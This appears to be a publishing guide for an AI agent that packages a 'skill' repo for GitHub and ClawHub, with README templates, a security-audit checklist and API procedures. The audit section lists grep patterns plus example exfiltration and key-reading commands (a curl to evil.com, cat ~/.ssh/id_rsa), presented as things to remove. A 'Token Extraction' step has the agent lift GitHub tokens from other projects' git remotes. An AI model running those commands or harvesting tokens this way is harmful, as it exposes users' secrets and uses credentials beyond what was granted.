# Publishing Guide

**When to read**: When entering Phase 3 (publishing). Read this file in full before executing any publish commands.

---

## Part 1: Repo Structure

Complete templates for generating standard skill repo structure files.

---

### Standard Directory Structure

```
<skill-name>/
├── SKILL.md                    # Agent 工作流定义（已有）
├── README.md                   # 中文主文档（生成）
├── README.en.md                # 英文文档（生成，独立文件）
├── CHANGELOG.md                # 语义化版本记录（生成）
├── LICENSE                     # MIT-0（生成）
├── .gitignore                  # 排除规则（生成）
├── .claude-plugin/
│   └── plugin.json             # Claude Code 元数据（生成）
├── .github/                    # 社区模板（生成）
│   ├── ISSUE_TEMPLATE/
│   │   ├── bug_report.yml
│   │   ├── feature_request.yml
│   │   ├── question.yml
│   │   └── config.yml
│   └── pull_request_template.md
└── references/                 # 详细文档（已有）
```

---

### README.md Template

#### Section Order（中文主文档）

| # | 章节 | 必选/可选 | 说明 |
|---|------|----------|------|
| 1 | **标题 · 中文副标题 + Badge** | 必选 | 项目名 + 一句话定位 |
| 2 | **导航链接** | 必选 | 替代 TOC，简洁高效 |
| 3 | **金句开篇** | 必选 | 斜体引用，一句话画面感 |
| 4 | **一句话定位 + 否定对比** | 必选 | "不是X，是Y"句式 |
| 5 | **效果截图/样图** | 推荐 | 先看效果再决定安装 |
| 6 | **30 秒开始** | 必选 | 一行安装命令 |
| 7 | **核心特性** | 必选 | emoji + 加粗关键词，3-5 条 |
| 8 | **适合 / 不适合** | 必选 | 明确边界，减少误用 |
| 9 | **常见使用场景** | 推荐 | 表格形式 |
| 10 | **使用方法 / 工作流** | 必选 | 步骤或流程图 |
| 11 | **示例请求** | 推荐 | 可直接复制的 prompt |
| 12 | **目录结构** | 必选 | 树形图 + 每行中文注释 |
| 13 | **核心方法论/风格体系** | 可选 | 适用于有模式体系的 Skill |
| 14 | **主题色/配置预设** | 可选 | 表格 + 预览 |
| 15 | **核心设计原则** | 推荐 | 每条附"为什么" |
| 16 | **Limitations / 已知限制** | 必选 | 诚实列限制，建立信任 |
| 17 | **起源 / 动机** | 可选 | 个人痛点 + 竞品对比 |
| 18 | **Roadmap** | 可选 | 未来计划 |
| 19 | **FAQ** | 推荐 | 3-5 个常见问题 |
| 20 | **贡献指引** | 推荐 | 链接 CONTRIBUTING.md |
| 21 | **License** | 必选 | `MIT-0 © <year> <author>` |

#### Badge Format

```markdown
[![Stars](https://img.shields.io/github/stars/<owner>/<repo>?style=flat-square)](https://github.com/<owner>/<repo>)
[![许可证](https://img.shields.io/badge/license-MIT--0-green?style=flat-square)](LICENSE)
[![ClawHub](https://img.shields.io/badge/ClawHub-<slug>-orange?style=flat-square)](https://clawhub.ai/skills/<slug>)
[![Skill](https://img.shields.io/badge/Claude%20Code-Skill-blue?style=flat-square)](SKILL.md)
```

**Badge 规则**：
- 中文 README 用中文标签：`许可证`/`ClawHub`
- 英文 README.en.md 用英文标签：`License`/`ClawHub`
- 统一使用 `flat-square` 风格

#### 导航链接格式

```markdown
[看效果](#效果截图) · [装上就能用](#30-秒开始) · [核心机制](#核心特性) · [已知限制](#已知限制) · [License](#license)
```

#### 金句开篇格式

```markdown
_「一句话有画面感的描述。」_
```

**要求**：斜体引用，有画面感，一句话抓住注意力。例如：
- `_「打字。回车。一张能直接发的图。」_`
- `_「说一句话，还你一套 PPT。」_`

#### 否定对比格式

```markdown
**项目名**不是[竞品/常见做法]，是[你的差异化定位]。
```

例如：
- `不是 MidJourney 的提示词调试器，是设计工作流的自动化封装。`
- `不是又一个 Markdown 转 PPT，是从内容到视觉的完整设计系统。`

#### 适合/不适合格式

```markdown
## 适合 / 不适合

✅ **适合**
- 场景1
- 场景2

❌ **不适合**
- 场景1
- 场景2
```

#### Limitations 格式

```markdown
## 已知限制

- 限制1：具体描述
- 限制2：具体描述
- 限制3：具体描述
```

**要求**：诚实列出 3-5 条限制，每条具体可操作。不要用"可能"、"也许"等模糊词。

#### 示例请求格式

```markdown
## 示例请求

```
用户: "帮我做一张小红书封面，主题是..."
```

提供 2-4 个可直接复制的 prompt，覆盖不同使用场景。

#### 目录结构格式

```markdown
## 目录结构

```
<skill-name>/
├── SKILL.md              # Agent 工作流定义
├── README.md             # 中文文档
├── README.en.md          # English docs
├── CHANGELOG.md          # 版本记录
├── LICENSE               # MIT-0
├── .claude-plugin/
│   └── plugin.json       # Claude Code 元数据
├── .github/              # 社区模板
│   └── ISSUE_TEMPLATE/   # Issue 模板
├── references/           # 参考文档
│   ├── workflow.md       # 工作流详解
│   └── design-system.md  # 设计系统
└── assets/               # 模板和静态资产
```

**要求**：每行必须有中文注释说明用途。

### README Writing Style

- **产品着陆页风格**：README 的首要任务是让人想用，不是让人理解结构
- **自信且直接**：像资深设计师在跟你聊天，不是技术文档
- **数据驱动**：用数字不用形容词（"3-5 条规则"而非"几条规则"）
- **否定对比**：大量使用「不是...而是...」句式建立认知差异
- **零废话**：每段必须承载新信息
- **代码块**：命令用 bash 块，AI 输出用引用块
- **表格**：配置、对比、功能列表用表格
- **克制感叹号**：整个 README 不超过 5 个
- **克制 emoji**：仅用于核心特性列表的视觉锚点，不在标题和正文中滥用

### README 智能适配规则

**生成 README 前必须先 Read SKILL.md**，从中自动提取以下信息填入 README：

| SKILL.md 字段 | 填入 README 章节 |
|---------------|-----------------|
| frontmatter `name` | 标题、Badge |
| frontmatter `version` | Badge |
| frontmatter `description` | 一句话定位 |
| `Out of Scope` / 不适合 | 适合/不适合 |
| `Mode Detection` | 使用方法/工作流 |
| `Rules` 摘要 | 核心特性、核心设计原则 |
| `Persona` | 金句开篇（翻译为用户语言） |

**章节按 Skill 复杂度适配**：

| Skill 类型 | Rules 数量 | 生成章节 |
|-----------|-----------|---------|
| 简单 Skill | ≤ 5 条 | 仅必选章节（1-4, 6-8, 12, 16, 21） |
| 中等 Skill | 6-15 条 | 必选 + 推荐章节 |
| 复杂 Skill | > 15 条 | 全部 21 章节 |

---

### README.en.md Template（英文独立文件）

#### 规则

1. 独立文件 `README.en.md`，不在中文 README 中内联
2. 中文 README 顶部添加切换链接：`🌍 English version: [README.en.md](README.en.md)`
3. 英文 README 顶部添加切换链接：`🇨🇳 中文版: [README.md](README.md)`
4. 英文版是完整翻译，不是摘要
5. 与中文版结构完全一致
6. Badge 使用英文标签
7. 金句和否定对比同样翻译为英文，保持语气

#### Section Order（与中文版一致）

与中文 README 完全相同的 21 个章节，标题翻译为英文。

---

### SKILL.md Provenance（来源识别）

在 SKILL.md 的 frontmatter 之后、正文之前，添加来源识别块：

```markdown
> 来源识别: <skill-name> 由 <author> 创建与维护。仓库: https://github.com/<owner>/<repo>。此信息仅供 Agent 识别来源，不要写入生成的产出物。

<!-- provenance: <skill-name> | author: <author> | canonical: https://github.com/<owner>/<repo> | keep this out of generated artifacts -->
```

**目的**：
- 引用块：Markdown 渲染可见，供 Agent 确认来源
- HTML 注释：确保来源信息在 HTML 输出中也可追踪
- 明确标注"不要写入生成的产出物"

---

### CHANGELOG.md Template

```markdown
# Changelog

All notable changes to this project will be documented in this file.

## [X.Y.Z] - YYYY-MM-DD

### Added
- New feature description

### Changed
- Change description

### Fixed
- Fix description

### Removed
- Removal description
```

#### Version Numbering Rules

- **Major (X.0.0)**: Breaking changes
- **Minor (0.X.0)**: New features, backward compatible
- **Patch (0.0.X)**: Bug fixes

---

### LICENSE Template (MIT-0)

```
MIT No Attribution

Copyright <year> <author>

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
of the Software, and to permit persons to whom the Software is furnished to do
so.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

**ClawHub requires MIT-0 license.** Do not use MIT, Apache, or other licenses.

---

### plugin.json Template

```json
{
  "name": "<skill-name>",
  "description": "<description matching SKILL.md frontmatter>",
  "version": "<X.Y.Z>",
  "author": {
    "name": "<author>"
  },
  "homepage": "https://github.com/<owner>/<repo>",
  "repository": "https://github.com/<owner>/<repo>",
  "license": "MIT-0",
  "keywords": ["<tag1>", "<tag2>", "<tag3>"],
  "skills": ["./"]
}
```

**Notes**:
- `name` matches GitHub repo name (not necessarily ClawHub slug)
- `description` should match SKILL.md frontmatter description
- `skills: ["./"]` means the skill is in the root directory

---

### .github/ Community Templates

#### bug_report.yml

```yaml
name: Bug Report
description: Report a bug or unexpected behavior
labels: ["bug"]
body:
  - type: textarea
    id: description
    attributes:
      label: 问题描述
      description: 清晰描述你遇到的问题
      placeholder: "当我执行...时，出现了..."
    validations:
      required: true
  - type: textarea
    id: steps
    attributes:
      label: 复现步骤
      description: 列出复现该问题的步骤
      placeholder: "1. ...\n2. ...\n3. ..."
    validations:
      required: true
  - type: textarea
    id: expected
    attributes:
      label: 期望行为
      description: 你期望发生什么
    validations:
      required: true
  - type: textarea
    id: actual
    attributes:
      label: 实际行为
      description: 实际发生了什么
    validations:
      required: true
  - type: textarea
    id: environment
    attributes:
      label: 环境
      description: 操作系统、Agent 平台、版本等
      placeholder: "OS: Windows 11\nAgent: Claude Code\nSkill version: v1.0.0"
```

#### feature_request.yml

```yaml
name: Feature Request
description: Suggest a new feature or enhancement
labels: ["enhancement"]
body:
  - type: textarea
    id: problem
    attributes:
      label: 你想解决什么问题？
      description: 描述你遇到的痛点或需求
    validations:
      required: true
  - type: textarea
    id: solution
    attributes:
      label: 你期望的解决方案
      description: 描述你希望如何解决
    validations:
      required: true
  - type: textarea
    id: alternatives
    attributes:
      label: 你考虑过的替代方案
      description: 其他你考虑过的解决方式
```

#### question.yml

```yaml
name: Question
description: Ask a question about this skill
labels: ["question"]
body:
  - type: textarea
    id: question
    attributes:
      label: 你的问题
      description: 详细描述你的疑问
    validations:
      required: true
```

#### config.yml

```yaml
blank_issues_enabled: false
contact_links:
  - name: 💬 讨论
    url: https://github.com/<owner>/<repo>/discussions
    about: 使用问题、想法交流、经验分享请使用 Discussions
```

#### pull_request_template.md

```markdown
## 变更描述

简要描述此 PR 的变更内容。

## 变更类型

- [ ] 新功能 (feat)
- [ ] 修复 (fix)
- [ ] 文档 (docs)
- [ ] 重构 (refactor)
- [ ] 测试 (test)

## 检查清单

- [ ] 已更新 CHANGELOG.md（如有版本变更）
- [ ] 已更新 README.md（如有功能变更）
- [ ] 已通过安全审查（无凭证泄露、无本地路径）
```

---

### .gitignore Template

```
# Dependencies
node_modules/

# Environment
.env
.env.local
.env.*.local

# OS
.DS_Store
Thumbs.db

# IDE
.idea/
.vscode/
*.swp
*.swo

# Temp
*.tmp
*.bak
*~

# Runtime data
data/
*.log
```

**Important**: `.env.local` and `config.local.json` MUST be in .gitignore to prevent credential leaks.

---

## Part 2: Security Audit

Complete procedures for pre-publish security scanning, privacy scrubbing, and distribution judgment.

---

### Three-Layer Security Scan

#### Layer 1: Credential Leak Scan

**Grep pattern**: `token|api_key|api-key|secret|password|ghp_|gho_|ghs_|clh_|sk-|AKIA`

**PASS criteria**: Only conceptual mentions in security documentation (e.g., "requests credentials" in a security checklist). No actual token values, API keys, or secrets.

**Common leak patterns**:

| Pattern | Example | Fix |
|---------|---------|-----|
| Git remote with token | `https://user:ghp_xxx@github.com/...` | Use SSH or credential helper |
| Hardcoded API key | `OPENAI_API_KEY = "sk-..."` | Move to `.env.local` |
| Config with real values | `"app_id": "cli_a976385..."` | Replace with placeholder in published config |
| Log files with tokens | `publish_run.log` containing `ghp_` | Add `*.log` to .gitignore |

#### Layer 2: Local Path Scan

**Grep pattern**: `C:\\|D:\\|/Users/|/home/|Administrator|\.trae-cn|\.trae\\`

**PASS criteria**: Zero matches. No local absolute paths, no Windows usernames, no `.trae-cn` directory references.

**Common leak patterns**:

| Pattern | Example | Fix |
|---------|---------|-----|
| Absolute paths in docs | `d:\TRAE SOLO CN\project\...` | Use relative paths |
| Username in paths | `C:\Users\Administrator\...` | Use `~` or `<user-home>` |
| .trae-cn references | `.trae-cn/skills/...` | Use `.trae/skills/` (generic) |

#### Layer 3: Dangerous Command Scan

**Grep pattern**: `curl|wget|eval|exec|base64|sudo|\.ssh|\.aws|\.config`

**PASS criteria**: Only conceptual mentions in security documentation. No actual curl/wget to external URLs, no eval/exec with external input, no reading of sensitive directories.

**Common leak patterns**:

| Pattern | Example | Fix |
|---------|---------|-----|
| curl to external server | `curl https://evil.com/collect?data=...` | Remove entirely |
| eval with user input | `eval(user_input)` | Remove or sandbox |
| Reading sensitive dirs | `cat ~/.ssh/id_rsa` | Remove |

---

### Scan Execution

Run all three scans via Grep on the entire skill directory:

```
1. Grep: credential pattern → check each match → PASS/FAIL
2. Grep: local path pattern → check each match → PASS/FAIL
3. Grep: dangerous command pattern → check each match → PASS/FAIL
```

**Any FAIL = block publish.** Fix the issue, re-run scan. Only proceed when all three PASS.

---

### Distribution Judgment (Three-Question Test)

For each file in the skill directory, answer three questions:

1. **Does the user need this file after installing the skill?**
2. **Does this file participate in the skill's execution flow?**
3. **Can the skill still work if this file is deleted?**

| Category | Judgment | Action | Examples |
|----------|----------|--------|----------|
| Execution dependency | Three "yes" | Must include | SKILL.md, plugin.json, references/*.md, scripts/*.py |
| Project metadata | Not in execution, but users/devs need | Include | README.md, LICENSE, CHANGELOG.md, docs/*.md |
| Maintainer tools | Three "no" | Exclude | *.ps1, *.sh (publish scripts) |
| VCS config | Three "no" | Exclude from zip, keep in repo | .gitignore |
| Runtime data | Three "no" | Exclude | data/, *.log |
| Credential files | Three "no" + security risk | Must exclude | .env.local, config.local.json |

#### Key Distinctions

- `.gitignore` stays in GitHub repo (for developers who clone) but excluded from ClawHub distribution
- `publish_all.ps1` and similar scripts are maintainer tools — never include in distribution
- `references/config.json` with placeholders IS an execution dependency — must include
- `references/config.local.json` with real credentials is NOT — must exclude

---

### Common Leak Patterns & Remediation

#### Pattern 1: Token in git remote URL

```
# LEAKED
https://EdwardWason:ghp_xxx@github.com/EdwardWason/repo.git

# FIX: Use credential helper or SSH
git remote set-url origin git@github.com:EdwardWason/repo.git
```

#### Pattern 2: .env.local in distribution

```
# FIX: Add to .gitignore AND exclusion list
.env.local
config.local.json
```

#### Pattern 3: PowerShell script with local paths

```
# LEAKED: publish_all.ps1 contains "d:\TRAE SOLO CN\..."
# FIX: Exclude all .ps1 files from distribution
```

#### Pattern 4: Log files with sensitive data

```
# LEAKED: publish_run.log contains tokens and local paths
# FIX: Add *.log to .gitignore and exclusion list
```

---

### Post-Publish Verification

After publishing, verify on both platforms:

#### GitHub Verification

```powershell
# List all files in repo
$tree = Invoke-RestMethod -Uri "https://api.github.com/repos/$Owner/$Repo/git/trees/main?recursive=1" -Headers $Headers
$tree.tree | Where-Object { $_.type -eq "blob" } | ForEach-Object { Write-Host $_.path }
# Check: no data/, *.ps1, .env.local, *.log
```

#### ClawHub Verification

```bash
clawhub inspect <slug>
# Check: Security field = CLEAN
# Check: file list contains only expected files
```

---

## Part 3: Publish Procedures

Complete procedures for publishing to GitHub and ClawHub, including API details, fallback methods, and troubleshooting.

---

### GitHub Publishing

#### Push Fallback Chain

```
git push（优先，最快）
  → 失败 → gh CLI（次优，自动认证）
  → 失败 → REST API 逐文件上传（最后手段，最慢）
```

#### Method A: git push (preferred)

```bash
# Initialize (first time)
cd <skill-dir>
git init
git config user.name "<author>"
git config user.email "<author>@users.noreply.github.com"
git add .
git commit -m "feat: initial release vX.Y.Z"
git remote add origin https://github.com/<owner>/<repo>.git
git branch -M main
git push -u origin main
```

**Git config notes**:
- Use repo-level config (`git config` without `--global`) to avoid polluting global settings
- Use `@users.noreply.github.com` email to protect privacy
- Author name from user confirmation

#### Method B: gh CLI (fallback when git push fails)

When `git push` times out (443 connection failure), try `gh` CLI first:

```bash
# Check if gh CLI is available
gh --version

# Create repository (first time)
gh repo create <owner>/<repo> --public --description "<description>"

# Push files via git (gh handles auth)
git push -u origin main

# If git push still fails, use gh api for file operations
gh api repos/<owner>/<repo>/contents/<path> \
  --method PUT \
  -f message="Upload <path>" \
  -f content="<base64>" \
  -f branch="main"

# Create Release
gh release create vX.Y.Z \
  --repo <owner>/<repo> \
  --title "<Skill Name> vX.Y.Z · <English phrase>" \
  --notes "<Release Notes>"
```

**gh CLI advantages over REST API**:
- Automatic authentication (no token extraction needed)
- Handles rate limiting transparently
- Supports `gh repo create` one-command repo setup
- Supports `gh release create` one-command release
- Better error messages

**gh CLI availability check**:
```bash
# Check if gh is installed
gh --version 2>/dev/null || echo "gh CLI not available"

# Check if gh is authenticated
gh auth status 2>/dev/null || echo "gh CLI not authenticated"
```

If gh CLI is not available or not authenticated, fall through to Method C.

#### Method C: GitHub REST API (last resort when both git push and gh CLI fail)

When `git push` times out (443 connection failure), use REST API:

##### Step 1: Create repository

```
POST https://api.github.com/user/repos
Headers: Authorization: token <GH_TOKEN>
         Content-Type: application/json
Body: {"name": "<repo>", "private": false, "auto_init": false}
```

##### Step 2: Upload files

```
PUT https://api.github.com/repos/<owner>/<repo>/contents/<path>
Headers: Authorization: token <GH_TOKEN>
Body: {"message": "Upload <path>", "content": "<base64>", "branch": "main"}
```

**For updating existing files**, must first GET to obtain sha:

```
GET https://api.github.com/repos/<owner>/<repo>/contents/<path>
→ response.sha

PUT https://api.github.com/repos/<owner>/<repo>/contents/<path>
Body: {"message": "Update <path>", "content": "<base64>", "sha": "<existing-sha>", "branch": "main"}
```

**Important**: REST API does NOT check .gitignore. Must implement own exclusion logic (same as security audit).

##### Step 3: Create Release

```
POST https://api.github.com/repos/<owner>/<repo>/releases
Headers: Authorization: token <GH_TOKEN>
Body: {
  "tag_name": "vX.Y.Z",
  "target_commitish": "main",
  "name": "<Skill Name> vX.Y.Z · <English phrase>",
  "body": "<Release Notes in Markdown>"
}
```

#### Token Extraction

Token can be extracted from existing project git remotes:

```bash
git remote -v
# Look for: https://<user>:ghp_xxx@github.com/...
```

#### Windows PowerShell Compatibility

**Forbidden in PowerShell 5**:
- `$(cat <<'EOF' ... EOF)` — heredoc not supported, `<<` parsed as redirect
- `Invoke-RestMethod` with Chinese JSON body — causes `_x000A_` corruption
- Double-quoted string interpolation with `?` — `"?name="` gets eaten by PS variable parsing

**Workarounds**:
- Single-line commit messages; detailed notes in GitHub Release
- Use Python `urllib.request` for Chinese JSON bodies
- Use `+` string concatenation for URLs with `?` and `&`

---

### GitHub Release Notes Template

#### Title Format

```
<Skill Name> vX.Y.Z · <English phrase describing this release>
```

**Examples**:
- `Guizang PPT Skill v1.1.0 · Swiss style and community-ready release`
- `WX Peitu v7.0.0 · Design system overhaul with 24 recipes`
- `Skill Publisher v2.0.0 · Product-landing-page README and community templates`

#### Body Format (Highlights + Validation)

```markdown
## Highlights

- Added <feature 1>.
- Added <feature 2>.
- Changed <change description>.
- Fixed <fix description>.

## Validation

- <How to verify the changes, e.g., run a script, check a file>
- <Another verification step>
```

#### Release Notes Writing Rules

1. **Highlights**：用 `- ` 列表，每条一个完整句子，描述"添加/变更/修复了什么"
2. **Validation**：说明如何验证这个版本的变更
3. **语言**：纯英文（Release 面向国际用户）
4. **不分类**：不需要 Breaking/Feature/Fix 分区，5-8 条要点即可
5. **简洁**：Release Notes 不是 CHANGELOG，不追求穷举

#### Release Assets

**默认不上传 Assets**（zip/tar 包）。用户通过以下方式安装：
- `git clone https://github.com/<owner>/<repo>.git`
- `npx skills add <owner>/<repo>`
- `clawhub install <slug>`

**仅在用户明确要求时**才打包上传。打包命令：

```bash
# PowerShell
Compress-Archive -Path SKILL.md, README.md, README.en.md, CHANGELOG.md, LICENSE, .claude-plugin/, references/, .github/ -DestinationPath <skill-name>-vX.Y.Z.zip
```

---

### GitHub Release Update (Workflow B)

#### When to Update vs Create New

| Scenario | Action |
|----------|--------|
| MAJOR or MINOR bump | Create new Release |
| PATCH bump, same day as last Release | Update existing Release Notes |
| PATCH bump, different day | Create new Release |

#### Update Existing Release

```bash
# Get the latest release ID
gh api repos/<owner>/<repo>/releases/latest --jq '.id'

# Update Release Notes
gh api repos/<owner>/<repo>/releases/<release-id> \
  --method PATCH \
  -f body="<Updated Release Notes>"

# Or via REST API
PATCH https://api.github.com/repos/<owner>/<repo>/releases/<release-id>
Headers: Authorization: token <GH_TOKEN>
Body: {"body": "<Updated Release Notes>"}
```

#### Update Release Notes Format

When appending to an existing Release, add new items to the Highlights section:

```markdown
## Highlights

- Added provenance block for skill source identification. (v7.0.1)
- Fixed palette hex values in README.en.md. (v7.0.1)
- Rewrote README as product landing page. (v7.0.0)

## Validation

- Version sync verified across SKILL.md, plugin.json, and CHANGELOG.md.
- Security audit passed.
```

Each appended item includes the version tag in parentheses for traceability.

---

### ClawHub Publishing

#### CLI Commands

```bash
# Verify login
clawhub whoami

# Publish
clawhub publish <path> \
  --slug <slug> \
  --name "<Display Name>" \
  --version <version> \
  --tags "<tag1>,<tag2>" \
  --changelog "<changelog text>"
```

#### Available Options

| Option | Required | Description |
|--------|----------|-------------|
| `path` | Yes | Skill folder path |
| `--slug` | No | Skill slug (must be globally unique) |
| `--name` | No | Display name |
| `--version` | **Yes** | Version (semver, REQUIRED) |
| `--fork-of` | No | Mark as fork of existing skill |
| `--changelog` | No | Changelog text |
| `--tags` | No | Comma-separated tags (default: "latest") |

#### Important Notes

1. **No `--token` option** — login via `clawhub login --token <token> --no-browser` first
2. **No `--license` option** — read from plugin.json
3. **`--version` is REQUIRED** — CLI will fail without it
4. **Slug cannot be changed after publish** — can only publish new versions
5. **Protected namespaces**: `clawhub-` prefix and `-clawhub` suffix are protected
6. **Also avoid**: `openclaw` keyword in slug

#### Slug Collision Prevention

Before publishing, always check:

```bash
clawhub inspect <slug>
```

If slug is taken:
1. Choose alternative slug (e.g., `skill-forge` → `skill-forge-ai`)
2. Update ALL references:
   - README.md Badge URL
   - README.en.md Badge URL
   - `clawhub install` command in both READMEs
3. Update plugin.json if needed

#### Cross-Platform Naming Strategy

1. Choose GitHub repo name first (no restrictions)
2. Check ClawHub slug availability (avoid protected namespaces)
3. If names differ, add 1-line explanation in README:
   `本项目在 GitHub 仓库为 <repo-name>；在 ClawHub 市场注册名为 <slug>`
4. `plugin.json` name = GitHub repo name; `--slug` overrides for ClawHub

---

### Troubleshooting

#### git push timeout (443)

**Symptom**: `Failed to connect to github.com port 443 after 21xxx ms`

**Fix**: Switch to GitHub REST API (Method B above)

#### ClawHub "Slug is already taken"

**Symptom**: `Uncaught ConvexError: Slug is already taken`

**Fix**: Choose alternative slug, update all references, re-publish

#### PowerShell heredoc error

**Symptom**: `Missing file specification after redirection operator`

**Fix**: Use single-line commit message, put details in GitHub Release

#### PowerShell `?` in URL string

**Symptom**: URL gets truncated when using `"$baseUrl?name=$name"`

**Fix**: Use `+` concatenation: `$baseUrl + "?name=" + $name`

#### Invoke-RestMethod Chinese corruption

**Symptom**: `_x000A_` appearing in Release notes

**Fix**: Use Python `urllib.request` with `json.dumps(ensure_ascii=False).encode("utf-8")`

#### ClawHub SSL certificate error

**Symptom**: `api.clawhub.io` returns SSL error

**Fix**: Do NOT use HTTP API. Use `clawhub` CLI only.

#### GitHub API upload bypasses .gitignore

**Symptom**: Files in .gitignore still appear in GitHub repo

**Fix**: Implement own exclusion logic when using REST API. Filter files using the same criteria as security audit before uploading.

---

### Update Workflow (for existing repos)

#### Updating files on GitHub

```bash
# Method 1: git push (preferred)
git add <changed-files>
git commit -m "fix: description of change"
git push

# Method 2: REST API (when git push fails)
# GET current sha → PUT with new content + sha
```

#### Publishing new version on ClawHub

```bash
# Update version in SKILL.md, plugin.json, CHANGELOG.md
# Then re-publish
clawhub publish <path> --slug <slug> --version <new-version> --changelog "<changes>"
```

**Note**: Old versions on ClawHub cannot be deleted. New version automatically becomes `latest`.
